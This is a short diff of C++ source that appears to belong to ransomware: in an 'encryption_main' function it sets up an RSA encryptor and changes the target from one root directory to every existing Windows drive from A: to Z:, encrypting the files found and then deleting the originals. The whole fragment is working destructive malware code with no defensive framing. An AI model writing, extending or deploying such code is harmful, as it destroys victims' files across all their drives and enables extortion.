@@ -64,7 +64,7 @@ int encryption_main( bool fromStart) {
 
 	string mod;
 	string pubKey;
-	string path = ROOT_DIR;
+	//string path = ROOT_DIR;
 	string pathToImage = get_path_to_jpeg();
 
 #if VM
@@ -145,11 +145,23 @@ int encryption_main( bool fromStart) {
 #endif
 	
 	rsaEncryptor.init_Encryptor(mod, pubKey);
-	iterate(path, rsaEncryptor, processed);
-	for(auto& path : processed)
+	for (char i = 'A';i <= 'Z';i++)
 	{
-		remove(path);
+		string pathToDriver;
+		pathToDriver += i;
+		pathToDriver += ':';
+		pathToDriver +='\\';
+		if(exists(pathToDriver))
+		{
+			iterate(pathToDriver, rsaEncryptor, processed);
+			for (auto& path : processed)
+			{
+				remove(path);
+			}
+		}
 	}
+	
+	
 	IDFile.open(pathToID, std::ios::in | std::ios::out);
 	if (!IDFile.is_open())
 	{
